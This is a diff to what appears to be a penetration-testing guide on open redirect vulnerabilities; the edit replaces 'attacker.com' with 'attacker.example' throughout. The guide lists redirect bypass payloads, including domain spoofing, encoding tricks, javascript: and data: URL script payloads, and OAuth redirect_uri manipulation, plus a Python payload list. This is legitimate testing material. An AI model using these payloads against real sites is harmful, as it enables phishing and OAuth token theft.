@@ -115,16 +115,16 @@ Open redirects can exist in various implementation patterns:
 1. **Basic Open Redirect Testing**:
    - Test with absolute URLs:
      ```
-     https://target.com/redirect?url=https://attacker.com
-     https://target.com/redirect?next=https://attacker.com
+     https://target.com/redirect?url=https://attacker.example
+     https://target.com/redirect?next=https://attacker.example
      ```
    - Test with protocol-relative URLs:
      ```
-     https://target.com/redirect?url=//attacker.com
+     https://target.com/redirect?url=//attacker.example
      ```
    - Test with relative path traversal:
      ```
-     https://target.com/redirect?url=/../redirect?url=https://attacker.com
+     https://target.com/redirect?url=/../redirect?url=https://attacker.example
      ```
 
 2. **Referer-Based Open Redirect Testing**:
@@ -136,7 +136,7 @@ Open redirects can exist in various implementation patterns:
    - Identify OAuth implementation redirect_uri parameters
    - Test for improper validation:
      ```
-     https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.com
+     https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.example
      ```
 
 ## Bypass Techniques
@@ -150,8 +150,8 @@ graph TD
     A --> E[Path-Based Bypasses]
     A --> F[Special Character Abuse]
 
-    B --> B1["target.com.attacker.com"]
-    B --> B2["attacker.com?target.com"]
+    B --> B1["target.com.attacker.example"]
+    B --> B2["attacker.example?target.com"]
 
     C --> C1["URL Encoding: %68%74%74%70%73..."]
     C --> C2["Double Encoding"]
@@ -159,19 +159,19 @@ graph TD
     D --> D1["javascript:alert(1)"]
     D --> D2["data:text/html;base64,..."]
 
-    E --> E1["////attacker.com"]
-    E --> E2["/\/attacker.com"]
+    E --> E1["////attacker.example"]
+    E --> E2["/\/attacker.example"]
 
-    F --> F1["target.com@attacker.com"]
-    F --> F2["attacker.com#target.com"]
+    F --> F1["target.com@attacker.example"]
+    F --> F2["attacker.example#target.com"]
     end
 ```
 
 ### Domain Spoofing Techniques
 
 ```
-https://target.com/redirect?url=https://target.com.attacker.com
-https://target.com/redirect?url=https://attacker.com?target.com
+https://target.com/redirect?url=https://target.com.attacker.example
+https://target.com/redirect?url=https://attacker.example?target.com
 https://target.com/redirect?url=https://attackertarget.com
 ```
 
@@ -184,7 +184,7 @@ https://target.com/redirect?url=https://attackertarget.com
 ### Encoding Bypass Techniques
 
 ```
-https://target.com/redirect?url=https%3A%2F%2Fattacker.com
+https://target.com/redirect?url=https%3A%2F%2Fattacker.example
 https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d
 ```
 
@@ -193,23 +193,23 @@ https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%65%72
 ```
 https://target.com/redirect?url=javascript:alert(document.domain)
 https://target.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-https://target.com/redirect?url=https;/attacker.com
+https://target.com/redirect?url=https;/attacker.example
 ```
 
 ### Path-Based Bypasses
 
 ```
-https://target.com/redirect?url=/\/attacker.com
-https://target.com/redirect?url=////attacker.com
-https://target.com/redirect?url=\/\/attacker.com/
+https://target.com/redirect?url=/\/attacker.example
+https://target.com/redirect?url=////attacker.example
+https://target.com/redirect?url=\/\/attacker.example/
 ```
 
 ### Special Character Abuse
 
 ```
-https://target.com/redirect?url=https://target.com@attacker.com
-https://target.com/redirect?url=https://attacker.com#target.com
-https://target.com/redirect?url=https://attacker.com\@target.com
+https://target.com/redirect?url=https://target.com@attacker.example
+https://target.com/redirect?url=https://attacker.example#target.com
+https://target.com/redirect?url=https://attacker.example\@target.com
 ```
 
 ## Vulnerabilities
@@ -221,53 +221,53 @@ https://target.com/redirect?url=https://attacker.com\@target.com
 1. **Framework Redirector Vulnerabilities**:
    - **Spring MVC**: Improper handling of the `url` parameter
      ```
-     /spring/login?url=https://attacker.com
+     /spring/login?url=https://attacker.example
      ```
    - **Laravel**: Unvalidated redirect in `redirect()` helper
      ```
-     /redirect?url=https://attacker.com
+     /redirect?url=https://attacker.example
      ```
    - **Express.js**: Unvalidated `res.redirect()` calls
      ```
-     /login?redirect=https://attacker.com
+     /login?redirect=https://attacker.example
      ```
    - **Next.js (App Router)**: Server Actions redirect abuse
      ```
      // Test Server Action redirect injection
-     /api/action?redirect=https://attacker.com
+     /api/action?redirect=https://attacker.example
      ```
    - **SvelteKit**: `goto()` and `redirect()` manipulation
      ```
      // Test in hooks.server.ts
-     /auth/callback?redirectTo=https://attacker.com
+     /auth/callback?redirectTo=https://attacker.example
      ```
    - **Remix**: loader/action redirect injection
      ```
-     /login?redirectTo=https://attacker.com
+     /login?redirectTo=https://attacker.example
      ```
    - **Astro**: redirect() in API routes
      ```
-     /api/redirect?url=https://attacker.com
+     /api/redirect?url=https://attacker.example
      ```
 
 2. **OAuth Implementation Vulnerabilities**:
    - **Implicit Flow Redirect**: Missing validation in `redirect_uri`
      ```
-     /oauth/authorize?response_type=token&redirect_uri=https://attacker.com
+     /oauth/authorize?response_type=token&redirect_uri=https://attacker.example
      ```
    - **Authorization Code Flow**: Improper `state` parameter handling
      ```
-     /oauth/callback?code=ABC123&state=https://attacker.com
+     /oauth/callback?code=ABC123&state=https://attacker.example
      ```
 
 3. **Social Login Vulnerabilities**:
    - **Facebook Login**: Unvalidated return_url parameter
      ```
-     /login/facebook/callback?return_url=https://attacker.com
+     /login/facebook/callback?return_url=https://attacker.example
      ```
    - **Google OAuth**: Improper redirect_uri validation
      ```
-     /auth/google/callback?redirect_uri=https://attacker.com
+     /auth/google/callback?redirect_uri=https://attacker.example
      ```
 
 ### Impact Scenarios
@@ -354,12 +354,12 @@ redirect_param = "url"
 
 # Common bypass payloads
 payloads = [
-    "https://attacker.com",
-    "//attacker.com",
-    "https%3A%2F%2Fattacker.com",
-    "/\/attacker.com",
-    "https://target.com@attacker.com",
-    "https://target.com.attacker.com",
+    "https://attacker.example",
+    "//attacker.example",
+    "https%3A%2F%2Fattacker.example",
+    "/\/attacker.example",
+    "https://target.com@attacker.example",
+    "https://target.com.attacker.example",
     "javascript:alert(document.domain)"
 ]
 
@@ -406,9 +406,9 @@ flowchart TD
 2. **Initial Testing Phase**:
    - Test basic payload patterns:
      ```
-     ?redirect=https://attacker.com
-     ?redirect=//attacker.com
-     ?redirect=\/\/attacker.com
+     ?redirect=https://attacker.example
+     ?redirect=//attacker.example
+     ?redirect=\/\/attacker.example
      ```
    - Observe redirection behavior
    - Document instances of successful redirects
@@ -437,9 +437,9 @@ flowchart TD
 1. Identify OAuth implementation
 2. Locate redirect_uri parameter
 3. Test various redirect_uri values:
-   - https://attacker.com
-   - https://target.com.attacker.com
-   - https://targetattacker.com
+   - https://attacker.example
+   - https://target.com.attacker.example
+   - https://targetattacker.example
 4. Check for token leakage in the redirection
 
 #### Post-Authentication Redirect Testing
@@ -447,8 +447,8 @@ flowchart TD
 1. Authenticate to the application
 2. Identify post-login redirects
 3. Test redirect parameters with different formats:
-   - Absolute URLs: `https://attacker.com`
-   - Relative with protocol: `//attacker.com`
+   - Absolute URLs: `https://attacker.example`
+   - Relative with protocol: `//attacker.example`
    - Encoded values: `%68%74%74%70%73%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d`
 
 #### URL Shortener Testing
@@ -458,7 +458,7 @@ flowchart TD
 3. Test shortening of various payload formats:
    - javascript:alert(1)
    - data: URLs
-   - Protocol-less URLs: //attacker.com
+   - Protocol-less URLs: //attacker.example
 
 ## Remediation Recommendations
 
